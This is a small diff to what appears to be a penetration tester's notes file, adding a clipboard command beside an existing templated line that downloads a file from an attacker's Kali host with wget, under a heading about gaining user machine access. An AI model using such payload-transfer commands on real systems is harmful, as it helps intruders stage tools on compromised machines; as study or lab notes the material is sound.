@@ -22,6 +22,10 @@ const command = `wget http://${KaliIP}:8888/[file]`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
+Clipboard
+```
+cat huge_payload.txt | xsel --clipboard --input
+```
 
 ---
 ## Hunting User Machine Access
